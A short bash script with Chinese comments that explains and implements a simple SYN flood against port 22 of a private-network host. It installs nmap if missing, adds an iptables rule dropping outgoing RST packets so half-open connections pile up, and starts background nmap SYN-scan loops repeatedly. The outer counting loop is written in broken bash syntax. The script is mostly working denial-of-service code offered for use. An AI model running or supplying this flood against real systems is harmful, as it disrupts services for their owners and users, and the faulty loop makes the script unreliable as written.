#!/bin/bash
#如何构造一个简单的syn泛洪攻击？

#客户端主机：
#1，利用iptables丢弃出方向的RESET报文
#因为nmap做syn扫描（发送syn，接受synack 后直接回复reset）时回发送reset断链，达不到模拟效果
#2，安装nmap
#利用nmap持续给主机某个端口发送syn，执行：
#while : ; do nmap  -nsS -p 22  192.168.101.216 > /dev/null ;done &
#可以多执行几次

#脚本
which nmap
if [ ! $? = 0 ];then
  yum install nmap
fi
iptables -A OUTPUT -p tcp -m tcp --tcp-flags RST RST -j DROP

while i < $1
do
  while : ; do nmap  -nsS -p 22  192.168.101.216 > /dev/null ;done &
  i+=1
done
